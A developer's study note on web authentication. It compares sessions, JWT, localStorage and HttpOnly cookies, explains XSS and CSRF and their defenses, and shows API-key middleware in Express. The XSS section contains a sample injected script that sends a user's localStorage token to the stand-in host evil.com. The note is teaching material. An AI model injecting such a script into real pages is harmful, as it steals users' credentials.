# Authentication Mechanisms and Web Security

The main question behind all of this: **how does a server know who you are, and how do we keep that safe?**

The full question chain:
```
JWT 存哪里?
  → localStorage 是什么?
  → 为什么 localStorage 不安全? (XSS)
  → Cookie 会有问题吗? (CSRF)
  → 怎么防? (SameSite, CSRF Token)
  → JWT 和 Cookie 到底什么关系?
```

---

## Cookie vs Session vs JWT — 不重复吗

Cookie is the **carrier** (how credentials travel). Session and JWT are the **contents** (what's inside). Same envelope, different contents.

**Session Cookie (traditional)**
```
Login → server stores session in database
      → gives you a session ID in a cookie
Each request → server looks up session ID in DB → finds who you are
```
Stateful — server must maintain session state in the database.

**JWT in Cookie (modern)**
```
Login → server packages user info + signature into a JWT
      → puts JWT in a cookie
Each request → server verifies JWT signature → knows who you are, no DB lookup
```
Stateless — all info is in the token itself.

---

## Where to store JWT

### localStorage

Browser built-in key-value store, isolated per domain:
```js
localStorage.setItem('token', 'eyJhbG...')  // write
localStorage.getItem('token')               // read
```
- Survives page refresh and browser restart
- NOT sent automatically with requests — JS must read and attach manually
- Only same-domain JS can access it

### Cookie (HttpOnly + SameSite)

```
Set-Cookie: token=eyJhbG...; HttpOnly; SameSite=Strict
```
- Sent automatically by browser on every matching request
- `HttpOnly` — JS cannot read it (only browser sends it)
- `SameSite=Strict` — browser won't send it on cross-origin requests

### Tradeoff

| | localStorage | HttpOnly Cookie + SameSite |
|---|---|---|
| XSS can steal it | Yes (JS can read) | No (HttpOnly blocks JS) |
| CSRF can use it | No (not auto-sent) | No (SameSite blocks cross-origin) |
| Modern recommendation | Not recommended | Recommended |

localStorage avoids CSRF but is exposed to XSS. A properly configured cookie avoids both.

---

## XSS — Cross-Site Scripting

Attacker injects malicious JS into your website. Victims' browsers execute it in your site's context.

```
Site has a comment box that renders HTML directly

Attacker submits:
  <script>
    fetch('evil.com/steal?t=' + localStorage.getItem('token'))
  </script>

Other users open the comment page
  → browser runs the script
  → their token is sent to evil.com
```

**Why localStorage is vulnerable to XSS:** any JS running on the page can read it — including injected malicious JS.

**Why HttpOnly cookie is not:** `HttpOnly` tells the browser to never expose the cookie to JS at all, even JS running on the same domain.

**Defense:** escape/sanitize all user-generated content before rendering, Content Security Policy (CSP).

---

## CSRF vs XSS

| | XSS | CSRF |
|---|---|---|
| Attack | Inject malicious code **into** target site | Forge requests **from another site** |
| Code runs | Inside target site's context | On evil.com, request sent to target |
| Can steal localStorage | Yes | No |
| Can steal HttpOnly Cookie | No | Doesn't need to — browser auto-attaches it |
| Defense | Sanitize input, CSP | SameSite Cookie, CSRF Token |

One line: **XSS = attacker's code runs on your site. CSRF = attacker tricks your browser into sending requests to your site.**

---

## Manual vs Automatic credential attachment

```
Automatic: Cookie        — browser handles it, no developer code needed
Manual:    Authorization header / x-api-key — JS handles it, developer writes the code
```

CSRF can only exploit automatic credentials. If JS must manually attach a credential, evil.com's form can't replicate that — forms can't set custom headers, and evil.com's JS can't read your localStorage.

---

## API Key verification — with and without AWS

**With AWS API Gateway (this project):**
```
Request → API Gateway checks x-api-key against its key list
        → valid: forward to Lambda
        → invalid: 403, Lambda never runs
```

**Without AWS, in a monolith (Express middleware):**
```js
const VALID_KEYS = process.env.API_KEYS.split(',')

app.use((req, res, next) => {
  const key = req.headers['x-api-key']
  if (!VALID_KEYS.includes(key)) {
    return res.status(403).json({ error: 'Invalid API key' })
  }
  next()  // valid — continue to route handlers
})

// all routes below are protected
app.get('/scan-jobs', ...)
```

Same logic, different location. API Gateway replaces the middleware.

---

## API Key vs JWT

| | API Key | JWT |
|---|---|---|
| Represents | Which **application** | Which **user** |
| Contents | Random string | Three Base64 parts: header.payload.signature |
| Expires | Usually not | Yes — has `exp` field |
| Verification | Lookup in list | Cryptographic signature check |
| Needs database? | Yes (key list) | No (signature is self-contained) |
| Knows which user? | No | Yes (userId in payload) |

API Key = security badge checked against a list.
JWT = photo ID — verifiable without a list, contains info about the holder.
